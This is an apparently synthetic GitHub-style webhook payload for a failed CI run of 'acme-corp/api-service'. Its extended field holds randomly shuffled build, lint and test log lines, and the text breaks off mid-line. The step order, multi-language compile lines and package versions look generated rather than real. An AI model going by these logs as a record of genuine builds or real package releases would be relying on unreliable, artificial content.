{
  "action": "completed",
  "workflow_run": {
    "id": 285,
    "name": "CI Pipeline",
    "head_branch": "feature/feat-469",
    "head_sha": "46e1b75b5f7ca96485b9542951778249e1825719",
    "status": "completed",
    "conclusion": "failure",
    "run_started_at": "2025-12-16T12:00:23.173049Z",
    "updated_at": "2025-12-16T12:01:30.925534Z"
  },
  "repository": {
    "full_name": "acme-corp/api-service",
    "name": "api-service"
  },
  "sender": {
    "login": "bob"
  },
  "_safeops_extended": {
    "raw_logs": "=== Step: e2e_tests ===\nCache hit for key-7441\nInstalling express@5.16.0\nInstalling jest@5.1.0\nStep 1/10: Building\n[12:00:23] INFO: Processing request\nArtifact uploaded: build.tar.gz (47MB)\n[12:00:23] INFO: Processing request\nStep 7/10: Building\nArtifact uploaded: build.tar.gz (48MB)\nInstalling lodash@4.16.0\nCompiling src/app.ts...\nStep 10/10: Building\nCache hit for key-8776\n  PASS: test_user_create (264ms)\nStep 8/10: Building\nInstalling webpack@4.19.0\nInstalling lodash@3.15.0\nCache hit for key-4007\nCache hit for key-9404\nCache hit for key-4917\nCache hit for key-9329\nStep 2/10: Building\nArtifact uploaded: build.tar.gz (38MB)\nCache hit for key-2375\nCache hit for key-2790\nInstalling express@3.10.0\nCache hit for key-4344\nStep 7/10: Building\nCache hit for key-5334\n\u2713 lint completed\nStep 8/10: Building\nCache hit for key-9780\nArtifact uploaded: build.tar.gz (45MB)\nCache hit for key-4670\nCache hit for key-2209\nCache hit for key-1499\n\u26a0 DEPRECATION: Feature will be removed in v4.0\n[12:00:23] INFO: Processing request\nStep 10/10: Building\nCompiling src/main.py...\n[12:00:23] WARN: Deprecated API usage\n  PASS: test_cache_hit (11ms)\nInstalling webpack@2.14.0\nCache hit for key-1606\nStep 5/10: Building\n[12:00:23] WARN: Deprecated API usage\nCompiling src/utils.go...\n[12:00:23] WARN: Deprecated API usage\nStep 9/10: Building\n[12:00:23] WARN: Deprecated API usage\n  PASS: test_auth_login (85ms)\nCache hit for key-5531\nCache hit for key-2825\n[12:00:23] INFO: Processing request\n\u2713 lint completed\n  PASS: test_cache_hit (48ms)\n  PASS: test_auth_login (370ms)\nCompiling src/utils.go...\nInstalling express@4.5.0\nInstalling lodash@1.9.0\nArtifact uploaded: build.tar.gz (1MB)\nStep 10/10: Building\n  PASS: test_auth_login (445ms)\n[12:00:23] INFO: Processing request\n[12:00:23] INFO: Processing request\nArtifact uploaded: build.tar.gz (37MB)\nInstalling react@3.11.0\n[12:00:23] INFO: Processing request\nStep 3/10: Building\n[12:00:23] INFO: Processing request\nCache hit for key-2534\nFAILED: test_user_create\nCache hit for key-6444\n\u2713 lint completed\nStep 1/10: Building\n\u2713 build completed\nCache hit for key-3054\nInstalling lodash@4.10.0\n\u26a0 DEPRECATION: Feature will be removed in v4.0\n[12:00:23] INFO: Processing request\nStep 3/10: Building\n[12:00:23] INFO: Processing request\n[12:00:23] INFO: Processing request\nArtifact uploaded: build.tar.gz (38MB)\n[12:00:23] INFO: Processing request\nCompiling src/app.ts...\nCompiling src/index.js...\nStep 8/10: Building\nInstalling express@5.8.0\n[12:00:23] INFO: Processing request\n[12:00:23] WARN: Deprecated API usage\nCompiling src/service.java...\n\u2713 build completed\nStep 5/10: Building\nInstalling webpack@5.14.0\nStep 7/10: Building\nCompiling src/handler.rs...\nCompiling src/utils.go...\n  PASS: test_db_connect (33ms)\nCompiling src/index.js...\nCompiling src/handler.rs...\n[12:00:23] INFO: Processing request\nArtifact uploaded: build.tar.gz (37MB)\nCompiling src/index.js...\nWARNING: lodash has known vulnerabilities\nStep 9/10: Building\n[12:00:23] WARN: Deprecated API usage\nCompiling src/service.java...\n  PASS: test_api_health (265ms)\nStep 4/10: Building\nArtifact uploaded: build.tar.gz (31MB)\nInstalling lodash@5.19.0\nArtifact uploaded: build.tar.gz (29MB)\nCache hit for key-1683\nInstalling express@2.9.0\nCompiling src/index.js...\nStep 9/10: Building\n=== Step e2e_tests completed ===\n=== Step: setup_node ===\nCache hit for key-5236\nCompiling src/utils.go...\n  PASS: test_cache_hit (104ms)\n  PASS: test_cache_hit (257ms)\nCache hit for key-7229\nCompiling src/service.java...\nStep 10/10: Building\nStep 10/10: Building\n[12:00:23] INFO: Processing request\nStep 5/10: Building\nStep 9/10: Building\nCompiling src/handler.rs...\nArtifact uploaded: build.tar.gz (48MB)\n[12:00:23] INFO: Processing request\nInstalling express@5.4.0\nArtifact uploaded: build.tar.gz (27MB)\nStep 5/10: Building\nStep 3/10: Building\n[12:00:23] INFO: Processing request\n[12:00:23] INFO: Processing request\n[12:00:23] INFO: Processing request\nCompiling src/service.java...\nInstalling lodash@1.10.0\n  PASS: test_db_connect (69ms)\nArtifact uploaded: build.tar.gz (34MB)\nCache hit for key-3241\nInstalling axios@3.14.0\n[12:00:23] INFO: Processing request\nInstalling jest@3.11.0\n[12:00:23] WARN: Deprecated API usage\nStep 5/10: Building\n[12:00:23] INFO: Processing request\nCompiling src/app.ts...\nCompiling src/handler.rs...\nArtifact uploaded: build.tar.gz (43MB)\n\u2713 lint completed\nInstalling jest@2.16.0\n[12:00:23] INFO: Processing request\n\u2717 build failed with exit code 38\nStep 10/10: Building\nStep 6/10: Building\nArtifact uploaded: build.tar.gz (14MB)\nStep 10/10: Building\nStep 3/10: Building\nArtifact uploaded: build.tar.gz (19MB)\n[12:00:23] INFO: Processing request\nInstalling axios@2.10.0\nStep 10/10: Building\n[12:00:23] INFO: Processing request\n[12:00:23] INFO: Processing request\nArtifact uploaded: build.tar.gz (7MB)\n  PASS: test_user_create (179ms)\nCache hit for key-5524\n[12:00:23] INFO: Processing request\n[12:00:23] WARN: Deprecated API usage\nCache hit for key-6747\n\u26a0 DEPRECATION: Feature will be removed in v5.0\n  PASS: test_auth_login (315ms)\n\u2713 lint completed\nInstalling lodash@2.19.0\nInstalling lodash@5.19.0\nCache hit for key-7648\n\u2713 lint completed\n  PASS: test_api_health (299ms)\nInstalling express@2.10.0\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nInstalling axios@3.9.0\n  PASS: test_auth_login (453ms)\n[12:00:23] INFO: Processing request\nInstalling prettier@5.18.0\n\u2713 test completed\nCompiling src/main.py...\n  PASS: test_user_create (15ms)\nCompiling src/utils.go...\n[12:00:23] WARN: Deprecated API usage\nStep 4/10: Building\nException: RuntimeError\nInstalling eslint@3.13.0\nInstalling jest@2.7.0\nCache hit for key-2225\nCache hit for key-5640\nStep 6/10: Building\nCompiling src/service.java...\nInstalling jest@2.6.0\nInstalling express@2.18.0\n\u2713 build completed\n[12:00:23] INFO: Processing request\n  PASS: test_user_create (4ms)\nCache hit for key-3355\n\u2713 lint completed\nInstalling eslint@2.3.0\n\u2713 build completed\n  PASS: test_cache_hit (412ms)\nCompiling src/handler.rs...\n\u2717 build failed with exit code 64\nInstalling react@1.11.0\n\u2713 test completed\nArtifact uploaded: build.tar.gz (7MB)\nCache hit for key-6322\n\u2717 build failed with exit code 60\nCompiling src/utils.go...\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nArtifact uploaded: build.tar.gz (39MB)\nStep 1/10: Building\nArtifact uploaded: build.tar.gz (10MB)\n[12:00:23] INFO: Processing request\nCompiling src/index.js...\nInstalling webpack@4.0.0\nArtifact uploaded: build.tar.gz (24MB)\nArtifact uploaded: build.tar.gz (32MB)\n\u2713 test completed\n\u2713 test completed\nCache hit for key-7359\nStep 8/10: Building\nStep 4/10: Building\nException: NullPointerException\n[12:00:23] WARN: Deprecated API usage\n=== Step setup_node completed ===\n=== Step: build ===\n\u2713 lint completed\n[12:00:23] INFO: Processing request\nCache hit for key-3612\nWARNING: axios has known vulnerabilities\nArtifact uploaded: build.tar.gz (27MB)\n  PASS: test_api_health (78ms)\n[12:00:23] INFO: Processing request\nCompiling src/index.js...\n\u2713 test completed\nInstalling jest@4.10.0\n[12:00:23] INFO: Processing request\nInstalling express@1.17.0\n  PASS: test_cache_hit (70ms)\n[12:00:23] INFO: Processing request\n[12:00:23] INFO: Processing request\n\u2713 test completed\n[12:00:23] INFO: Processing request\nCompiling src/service.java...\nStep 2/10: Building\nCache hit for key-1261\n  PASS: test_cache_hit (377ms)\n  PASS: test_auth_login (199ms)\nCache hit for key-2581\nInstalling webpack@4.14.0\nCache hit for key-9557\n[12:00:23] INFO: Processing request\nCompiling src/main.py...\n  PASS: test_db_connect (87ms)\nArtifact uploaded: build.tar.gz (4MB)\n  PASS: test_user_create (453ms)\nCache hit for key-7485\n[12:00:23] INFO: Processing request\nCompiling src/main.py...\n\u2713 lint completed\nCache hit for key-9691\n  PASS: test_api_health (224ms)\nCache hit for key-9501\nInstalling jest@3.6.0\nArtifact uploaded: build.tar.gz (35MB)\nCompiling src/app.ts...\nArtifact uploaded: build.tar.gz (38MB)\nArtifact uploaded: build.tar.gz (24MB)\n[12:00:23] INFO: Processing request\n[12:00:23] INFO: Processing request\nStep 10/10: Building\n  PASS: test_db_connect (360ms)\n  PASS: test_auth_login (304ms)\nStep 10/10: Building\nStep 8/10: Building\nCompiling src/index.js...\nFAILED: test_api_health\nStep 4/10: Building\nCache hit for key-2362\nCache hit for key-5954\nStep 10/10: Building\nCache hit for key-1149\nInstalling lodash@1.18.0\n\u2713 test completed\nInstalling express@3.8.0\nStep 3/10: Building\nCache hit for key-8405\n\u2713 lint completed\n[12:00:23] INFO: Processing request\n[12:00:23] INFO: Processing request\nStep 7/10: Building\nInstalling prettier@4.2.0\nArtifact uploaded: build.tar.gz (46MB)\n  PASS: test_cache_hit (94ms)\n[12:00:23] INFO: Processing request\n[12:00:23] INFO: Processing request\nCache hit for key-9349\nStep 10/10: Building\nCache hit for key-9441\n\u2713 build completed\nStep 8/10: Building\nCompiling src/utils.go...\nArtifact uploaded: build.tar.gz (12MB)\nStep 9/10: Building\nCache hit for key-7913\nArtifact uploaded: build.tar.gz (31MB)\nCompiling src/handler.rs...\n\u2713 test completed\nInstalling webpack@4.9.0\n\u2713 test completed\n\u2713 build completed\nCache hit for key-7641\n  PASS: test_user_create (89ms)\nArtifact uploaded: build.tar.gz (10MB)\nArtifact uploaded: build.tar.gz (19MB)\n\u2713 test completed\nArtifact uploaded: build.tar.gz (11MB)\n[12:00:23] INFO: Processing request\nCache hit for key-2110\nInstalling webpack@3.12.0\nStep 8/10: Building\n\u2717 build failed with exit code 48\nStep 10/10: Building\nArtifact uploaded: build.tar.gz (28MB)\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nInstalling axios@2.4.0\nArtifact uploaded: build.tar.gz (6MB)\nCompiling src/main.py...\n[12:00:23] INFO: Processing request\n\u2713 test completed\nArtifact uploaded: build.tar.gz (6MB)\nInstalling prettier@4.16.0\nInstalling axios@3.13.0\nCompiling src/app.ts...\n\u2713 build completed\nInstalling jest@3.5.0\nCache hit for key-1770\n  PASS: test_cache_hit (297ms)\nStep 8/10: Building\nInstalling axios@3.5.0\n\u2713 lint completed\n[12:00:23] ERROR: Connection failed\n\u2713 lint completed\n=== Step build completed ===\n=== Step: unit_tests ===\nArtifact uploaded: build.tar.gz (40MB)\nStep 6/10: Building\nArtifact uploaded: build.tar.gz (44MB)\nArtifact uploaded: build.tar.gz (11MB)\nCache hit for key-6108\n[12:00:23] INFO: Processing request\nWARNING: axios has known vulnerabilities\nInstalling axios@1.12.0\n\u2713 test completed\nCache hit for key-3250\nWARNING: axios has known vulnerabilities\n[12:00:23] INFO: Processing request\nArtifact uploaded: build.tar.gz (1MB)\nInstalling eslint@1.10.0\nStep 1/10: Building\nArtifact uploaded: build.tar.gz (27MB)\n  PASS: test_auth_login (128ms)\nStep 8/10: Building\nStep 9/10: Building\n\u2713 test completed\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nCompiling src/index.js...\n\u2713 build completed\nInstalling jest@5.8.0\nCompiling src/utils.go...\n\u2713 test completed\n[12:00:23] INFO: Processing request\n\u26a0 DEPRECATION: Feature will be removed in v2.0\n  PASS: test_auth_login (144ms)\n[12:00:23] INFO: Processing request\nCompiling src/index.js...\n\u2713 test completed\nArtifact uploaded: build.tar.gz (37MB)\nWARNING: jest has known vulnerabilities\n  PASS: test_db_connect (36ms)\n[12:00:23] INFO: Processing request\nCache hit for key-3738\nCache hit for key-2102\n  PASS: test_db_connect (324ms)\nCompiling src/main.py...\n\u2713 build completed\n[12:00:23] INFO: Processing request\nArtifact uploaded: build.tar.gz (34MB)\nStep 9/10: Building\nCompiling src/app.ts...\n  PASS: test_user_create (20ms)\nArtifact uploaded: build.tar.gz (13MB)\n\u2713 test completed\n\u2713 build completed\nInstalling react@1.2.0\nStep 9/10: Building\n\u2713 test completed\n\u2713 lint completed\n  PASS: test_cache_hit (434ms)\nArtifact uploaded: build.tar.gz (10MB)\nArtifact uploaded: build.tar.gz (2MB)\n\u26a0 DEPRECATION: Feature will be removed in v3.0\n\u2713 lint completed\nInstalling lodash@2.8.0\nCache hit for key-6777\nCompiling src/main.py...\n  PASS: test_user_create (268ms)\n  PASS: test_db_connect (462ms)\nCache hit for key-6344\nCompiling src/service.java...\nStep 5/10: Building\nCompiling src/main.py...\nCompiling src/service.java...\nInstalling axios@1.12.0\n  PASS: test_cache_hit (204ms)\n[12:00:23] INFO: Processing request\n\u2713 test completed\n[12:00:23] INFO: Processing request\n  PASS: test_user_create (486ms)\nCache hit for key-2930\nArtifact uploaded: build.tar.gz (41MB)\nInstalling eslint@5.12.0\n  PASS: test_auth_login (403ms)\n  PASS: test_user_create (58ms)\nInstalling react@5.10.0\n\u2713 lint completed\nStep 7/10: Building\n[12:00:23] INFO: Processing request\n[12:00:23] INFO: Processing request\nInstalling axios@5.11.0\nArtifact uploaded: build.tar.gz (11MB)\n  PASS: test_api_health (335ms)\n[12:00:23] INFO: Processing request\nCompiling src/main.py...\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nInstalling lodash@1.6.0\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nCompiling src/utils.go...\nInstalling prettier@3.13.0\n[12:00:23] ERROR: Connection failed\nArtifact uploaded: build.tar.gz (35MB)\n[12:00:23] INFO: Processing request\n  PASS: test_user_create (365ms)\nInstalling axios@4.14.0\nCompiling src/utils.go...\n  PASS: test_auth_login (481ms)\nCompiling src/handler.rs...\n  PASS: test_auth_login (277ms)\nInstalling axios@1.17.0\nStep 6/10: Building\n[12:00:23] INFO: Processing request\nCache hit for key-4179\nCache hit for key-4023\nCache hit for key-1960\n  PASS: test_cache_hit (368ms)\nCache hit for key-9318\nFAILED: test_cache_hit\nStep 2/10: Building\n  PASS: test_cache_hit (328ms)\n\u2713 lint completed\n  PASS: test_user_create (348ms)\n\u2713 lint completed\n=== Step unit_tests completed ===\n=== Step: checkout ===\nArtifact uploaded: build.tar.gz (23MB)\nArtifact uploaded: build.tar.gz (49MB)\nWARNING: lodash has known vulnerabilities\nCache hit for key-8138\n  PASS: test_api_health (359ms)\nArtifact uploaded: build.tar.gz (2MB)\nArtifact uploaded: build.tar.gz (8MB)\nCache hit for key-1820\n[12:00:23] INFO: Processing request\nArtifact uploaded: build.tar.gz (27MB)\n  PASS: test_db_connect (463ms)\n[12:00:23] INFO: Processing request\nCache hit for key-8015\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nCache hit for key-6260\nCompiling src/main.py...\nCompiling src/handler.rs...\n[12:00:23] INFO: Processing request\nCache hit for key-7226\nInstalling react@5.8.0\nStep 7/10: Building\nCache hit for key-9770\nInstalling lodash@2.6.0\nInstalling axios@4.5.0\nArtifact uploaded: build.tar.gz (34MB)\nCompiling src/service.java...\nCache hit for key-6444\n  PASS: test_api_health (292ms)\n[12:00:23] INFO: Processing request\nCompiling src/handler.rs...\nArtifact uploaded: build.tar.gz (26MB)\nCompiling src/service.java...\nCompiling src/service.java...\n  PASS: test_auth_login (221ms)\n[12:00:23] INFO: Processing request\nArtifact uploaded: build.tar.gz (8MB)\nCache hit for key-1633\nStep 10/10: Building\nInstalling react@5.16.0\nCache hit for key-6923\n  PASS: test_cache_hit (356ms)\nStep 7/10: Building\nCompiling src/service.java...\nInstalling axios@1.1.0\nInstalling axios@4.6.0\n[12:00:23] INFO: Processing request\n\u2713 build completed\nStep 8/10: Building\n\u2713 build completed\nCompiling src/handler.rs...\n\u2713 test completed\nStep 8/10: Building\n[12:00:23] INFO: Processing request\n\u2713 lint completed\nCompiling src/service.java...\n  PASS: test_auth_login (458ms)\nCompiling src/main.py...\n  PASS: test_cache_hit (250ms)\n\u2713 test completed\n  PASS: test_cache_hit (430ms)\nCompiling src/service.java...\n[12:00:23] INFO: Processing request\n\u2713 build completed\nCache hit for key-3107\n[12:00:23] INFO: Processing request\nCompiling src/utils.go...\nStep 7/10: Building\nArtifact uploaded: build.tar.gz (32MB)\nCompiling src/handler.rs...\nStep 7/10: Building\n\u2717 build failed with exit code 117\n  PASS: test_db_connect (32ms)\n[12:00:23] WARN: Deprecated API usage\nCompiling src/main.py...\nCompiling src/utils.go...\nCompiling src/main.py...\nInstalling lodash@5.3.0\nArtifact uploaded: build.tar.gz (46MB)\nCache hit for key-8269\n  PASS: test_cache_hit (386ms)\n[12:00:23] INFO: Processing request\n\u2713 build completed\n  PASS: test_api_health (264ms)\n\u2713 lint completed\nStep 4/10: Building\nInstalling axios@3.5.0\nWARNING: axios has known vulnerabilities\nException: TypeError\n  PASS: test_api_health (4ms)\nCache hit for key-8739\nArtifact uploaded: build.tar.gz (27MB)\nStep 8/10: Building\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nArtifact uploaded: build.tar.gz (50MB)\nCompiling src/utils.go...\n  PASS: test_user_create (60ms)\nStep 3/10: Building\nArtifact uploaded: build.tar.gz (49MB)\n[12:00:23] ERROR: Connection failed\nCache hit for key-7055\n  PASS: test_db_connect (255ms)\n[12:00:23] INFO: Processing request\nCache hit for key-2651\n[12:00:23] INFO: Processing request\nCompiling src/service.java...\nCache hit for key-1294\nStep 4/10: Building\nInstalling lodash@3.6.0\nStep 3/10: Building\n  PASS: test_cache_hit (302ms)\nCompiling src/app.ts...\nInstalling express@1.12.0\nCache hit for key-4807\nCompiling src/app.ts...\n  PASS: test_auth_login (182ms)\nInstalling prettier@5.14.0\n[12:00:23] WARN: Deprecated API usage\n=== Step checkout completed ===\n=== Step: lint ===\nStep 6/10: Building\nStep 3/10: Building\nFAILED: test_api_health\nCompiling src/service.java...\nCache hit for key-3265\nStep 2/10: Building\n  PASS: test_api_health (474ms)\nInstalling webpack@2.14.0\n[12:00:23] INFO: Processing request\nInstalling axios@1.12.0\n[12:00:23] INFO: Processing request\n  PASS: test_cache_hit (182ms)\nCompiling src/handler.rs...\nCompiling src/index.js...\nCache hit for key-4749\nCompiling src/utils.go...\nInstalling axios@2.0.0\nWARNING: jest has known vulnerabilities\nCompiling src/utils.go...\nArtifact uploaded: build.tar.gz (40MB)\nCompiling src/main.py...\nCache hit for key-1067\nInstalling prettier@1.1.0\nInstalling axios@2.8.0\nInstalling axios@2.18.0\nFAILED: test_cache_hit\nCompiling src/main.py...\n\u26a0 DEPRECATION: Feature will be removed in v5.0\n\u2713 build completed\n[12:00:23] INFO: Processing request\n  PASS: test_auth_login (456ms)\n[12:00:23] INFO: Processing request\nCompiling src/utils.go...\nCompiling src/main.py...\nCache hit for key-5944\n[12:00:23] INFO: Processing request\nArtifact uploaded: build.tar.gz (32MB)\nInstalling jest@3.6.0\n[12:00:23] WARN: Deprecated API usage\nCache hit for key-3922\n\u2713 test completed\n\u2713 build completed\n\u2713 build completed\nCompiling src/service.java...\nStep 5/10: Building\nInstalling webpack@5.1.0\nInstalling lodash@4.20.0\nArtifact uploaded: build.tar.gz (7MB)\n\u2713 test completed\nArtifact uploaded: build.tar.gz (48MB)\nCache hit for key-4020\nCache hit for key-5743\n\u2713 lint completed\nArtifact uploaded: build.tar.gz (33MB)\nStep 9/10: Building\nCache hit for key-6206\n[12:00:23] INFO: Processing request\n  PASS: test_db_connect (248ms)\nInstalling jest@2.2.0\n  PASS: test_api_health (267ms)\n  PASS: test_api_health (483ms)\n[12:00:23] INFO: Processing request\n[12:00:23] INFO: Processing request\n[12:00:23] INFO: Processing request\nArtifact uploaded: build.tar.gz (21MB)\n[12:00:23] INFO: Processing request\nStep 7/10: Building\nArtifact uploaded: build.tar.gz (39MB)\n\u2713 lint completed\n[12:00:23] INFO: Processing request\nCache hit for key-9027\nCompiling src/handler.rs...\nStep 3/10: Building\nInstalling lodash@3.15.0\nInstalling lodash@3.3.0\nCache hit for key-6759\nInstalling webpack@2.3.0\nArtifact uploaded: build.tar.gz (30MB)\n\u2713 test completed\nArtifact uploaded: build.tar.gz (46MB)\nStep 8/10: Building\nCache hit for key-3573\nArtifact uploaded: build.tar.gz (17MB)\n[12:00:23] INFO: Processing request\n[12:00:23] INFO: Processing request\n[12:00:23] INFO: Processing request\nCompiling src/app.ts...\n  PASS: test_db_connect (253ms)\nStep 10/10: Building\n  PASS: test_api_health (317ms)\n[12:00:23] INFO: Processing request\nInstalling axios@1.12.0\n\u2713 lint completed\nCompiling src/index.js...\n[12:00:23] INFO: Processing request\nStep 5/10: Building\n  PASS: test_auth_login (137ms)\nCache hit for key-7437\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nCompiling src/service.java...\n\u2713 test completed\nStep 4/10: Building\nArtifact uploaded: build.tar.gz (11MB)\nArtifact uploaded: build.tar.gz (44MB)\n\u2713 lint completed\nArtifact uploaded: build.tar.gz (15MB)\n[12:00:23] INFO: Processing request\nInstalling jest@1.20.0\nArtifact uploaded: build.tar.gz (23MB)\nInstalling webpack@5.6.0\nArtifact uploaded: build.tar.gz (9MB)\nCompiling src/index.js...\n[12:00:23] INFO: Processing request\nArtifact uploaded: build.tar.gz (24MB)\n  PASS: test_auth_login (77ms)\nStep 1/10: Building\nCache hit for key-5069\n=== Step lint completed ===\n=== Step: restore_cache ===\n  PASS: test_api_health (434ms)\nCompiling src/main.py...\nCache hit for key-3826\n  PASS: test_api_health (151ms)\nCompiling src/handler.rs...\nCompiling src/utils.go...\n  PASS: test_user_create (255ms)\n\u2713 build completed\n[12:00:23] INFO: Processing request\n[12:00:23] INFO: Processing request\nCache hit for key-4261\nCompiling src/utils.go...\nCache hit for key-6771\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nStep 7/10: Building\nCache hit for key-5579\n[12:00:23] INFO: Processing request\n[12:00:23] INFO: Processing request\nInstalling react@4.20.0\n[12:00:23] INFO: Processing request\n\u2713 build completed\n\u2713 test completed\nArtifact uploaded: build.tar.gz (26MB)\n[12:00:23] INFO: Processing request\nException: NullPointerException\nArtifact uploaded: build.tar.gz (9MB)\n  PASS: test_api_health (133ms)\nCompiling src/utils.go...\nWARNING: lodash has known vulnerabilities\nWARNING: eslint has known vulnerabilities\nStep 5/10: Building\n  PASS: test_db_connect (343ms)\nArtifact uploaded: build.tar.gz (11MB)\nStep 10/10: Building\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nWARNING: webpack has known vulnerabilities\nCache hit for key-3363\n[12:00:23] INFO: Processing request\n[12:00:23] INFO: Processing request\nArtifact uploaded: build.tar.gz (38MB)\nArtifact uploaded: build.tar.gz (27MB)\nInstalling axios@5.14.0\nCache hit for key-8022\n  PASS: test_api_health (354ms)\n\u2713 lint completed\n[12:00:23] INFO: Processing request\nInstalling axios@2.12.0\n\u2713 build completed\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nCache hit for key-6044\nInstalling prettier@2.5.0\nCompiling src/service.java...\n\u2717 build failed with exit code 90\n[12:00:23] INFO: Processing request\n  PASS: test_db_connect (276ms)\nCache hit for key-1943\n[12:00:23] INFO: Processing request\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nInstalling react@1.9.0\n[12:00:23] INFO: Processing request\nCompiling src/app.ts...\nInstalling webpack@3.20.0\n[12:00:23] INFO: Processing request\nCompiling src/main.py...\n[12:00:23] INFO: Processing request\nCache hit for key-5646\nCompiling src/index.js...\n  PASS: test_db_connect (131ms)\nInstalling axios@3.11.0\nInstalling eslint@5.16.0\nArtifact uploaded: build.tar.gz (7MB)\n[12:00:23] INFO: Processing request\n[12:00:23] INFO: Processing request\nArtifact uploaded: build.tar.gz (37MB)\n[12:00:23] ERROR: Connection failed\nInstalling eslint@4.3.0\nInstalling axios@2.1.0\n[12:00:23] INFO: Processing request\nInstalling axios@2.5.0\n\u2713 test completed\n\u2713 test completed\n  PASS: test_cache_hit (243ms)\nCache hit for key-4217\nStep 5/10: Building\n[12:00:23] INFO: Processing request\n  PASS: test_cache_hit (274ms)\n\u2713 build completed\nWARNING: axios has known vulnerabilities\nCache hit for key-1080\nInstalling prettier@2.16.0\n[12:00:23] INFO: Processing request\nArtifact uploaded: build.tar.gz (41MB)\nCache hit for key-2382\nArtifact uploaded: build.tar.gz (32MB)\nArtifact uploaded: build.tar.gz (32MB)\n[12:00:23] ERROR: Connection failed\n\u2713 test completed\nStep 6/10: Building\nStep 3/10: Building\n  PASS: test_db_connect (208ms)\nInstalling prettier@2.9.0\nArtifact uploaded: build.tar.gz (7MB)\nInstalling webpack@1.8.0\n\u2713 lint completed\n[12:00:23] INFO: Processing request\nStep 2/10: Building\n\u2713 test completed\nArtifact uploaded: build.tar.gz (35MB)\nException: ValueError\nCompiling src/main.py...\n[12:00:23] WARN: Deprecated API usage\nStep 7/10: Building\nCache hit for key-7685\n[12:00:23] INFO: Processing request\n\u26a0 DEPRECATION: Feature will be removed in v5.0\n[12:00:23] INFO: Processing request\nArtifact uploaded: build.tar.gz (27MB)\n=== Step restore_cache completed ===\n=== Step: type_check ===\nStep 6/10: Building\n\u2713 test completed\nCache hit for key-8030\n\u2713 build completed\nArtifact uploaded: build.tar.gz (38MB)\n  PASS: test_auth_login (389ms)\nCache hit for key-6662\nStep 6/10: Building\nInstalling eslint@4.18.0\nStep 4/10: Building\nStep 8/10: Building\nStep 3/10: Building\nInstalling prettier@2.11.0\nInstalling webpack@3.5.0\n\u2713 build completed\nCompiling src/handler.rs...\nCache hit for key-8639\nStep 6/10: Building\n\u2713 lint completed\n\u2713 build completed\nStep 9/10: Building\n\u2717 build failed with exit code 91\n[12:00:23] INFO: Processing request\n  PASS: test_api_health (221ms)\n\u2713 build completed\n\u2713 test completed\n[12:00:23] INFO: Processing request\n\u2713 build completed\n  PASS: test_auth_login (69ms)\nCache hit for key-7968\n[12:00:23] INFO: Processing request\nInstalling react@5.1.0\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nInstalling prettier@2.0.0\n  PASS: test_db_connect (495ms)\n  PASS: test_api_health (332ms)\nInstalling react@5.1.0\nCache hit for key-2189\n\u2717 build failed with exit code 64\nStep 2/10: Building\n[12:00:23] WARN: Deprecated API usage\nStep 1/10: Building\n\u2713 build completed\n\u2713 test completed\n  PASS: test_cache_hit (429ms)\n  PASS: test_db_connect (41ms)\n[12:00:23] INFO: Processing request\n\u2713 test completed\n\u2713 lint completed\nStep 4/10: Building\n\u26a0 DEPRECATION: Feature will be removed in v5.0\n  PASS: test_auth_login (66ms)\nInstalling prettier@2.17.0\nInstalling lodash@1.11.0\nWARNING: webpack has known vulnerabilities\nCache hit for key-7789\nArtifact uploaded: build.tar.gz (10MB)\nWARNING: eslint has known vulnerabilities\nStep 5/10: Building\nCache hit for key-9564\nCompiling src/service.java...\nArtifact uploaded: build.tar.gz (41MB)\n\u2713 lint completed\nCache hit for key-1590\nStep 5/10: Building\nException: TypeError\nCache hit for key-6866\n\u2713 test completed\n\u2717 build failed with exit code 48\n  PASS: test_db_connect (162ms)\n[12:00:23] INFO: Processing request\n[12:00:23] INFO: Processing request\nCompiling src/main.py...\n  PASS: test_auth_login (449ms)\nInstalling lodash@4.10.0\nArtifact uploaded: build.tar.gz (39MB)\nInstalling react@4.14.0\nCache hit for key-5581\nCompiling src/app.ts...\n\u2713 lint completed\nInstalling lodash@2.14.0\n\u2713 lint completed\nInstalling react@5.3.0\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nCache hit for key-1536\n[12:00:23] WARN: Deprecated API usage\n\u2713 lint completed\n  PASS: test_user_create (490ms)\n\u2713 lint completed\nInstalling lodash@4.19.0\nInstalling axios@4.4.0\n\u2713 lint completed\nStep 6/10: Building\n  PASS: test_user_create (53ms)\nStep 4/10: Building\nCache hit for key-1976\nStep 8/10: Building\nCache hit for key-7353\n[12:00:23] INFO: Processing request\nInstalling react@4.19.0\nException: TypeError\n\u2713 lint completed\n[12:00:23] INFO: Processing request\n[12:00:23] INFO: Processing request\nCompiling src/handler.rs...\nInstalling lodash@5.3.0\n[12:00:23] INFO: Processing request\n\u2713 build completed\nStep 2/10: Building\nArtifact uploaded: build.tar.gz (42MB)\nCompiling src/utils.go...\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nArtifact uploaded: build.tar.gz (37MB)\nCompiling src/app.ts...\n  PASS: test_api_health (215ms)\n  PASS: test_db_connect (369ms)\n\u2713 test completed\n=== Step type_check completed ===\n=== Step: install_dependencies ===\n  PASS: test_auth_login (478ms)\nCompiling src/app.ts...\nArtifact uploaded: build.tar.gz (29MB)\nCompiling src/utils.go...\n[12:00:23] INFO: Processing request\nInstalling axios@1.16.0\n  PASS: test_auth_login (209ms)\n[12:00:23] INFO: Processing request\n[12:00:23] INFO: Processing request\nCache hit for key-7000\nArtifact uploaded: build.tar.gz (32MB)\nCache hit for key-4044\nCache hit for key-3485\nCompiling src/index.js...\nInstalling prettier@2.20.0\nCompiling src/utils.go...\n\u2713 lint completed\n[12:00:23] ERROR: Connection failed\nArtifact uploaded: build.tar.gz (22MB)\nArtifact uploaded: build.tar.gz (3MB)\n\u26a0 DEPRECATION: Feature will be removed in v3.0\n\u2713 test completed\nStep 5/10: Building\nArtifact uploaded: build.tar.gz (40MB)\nInstalling prettier@4.7.0\n  PASS: test_db_connect 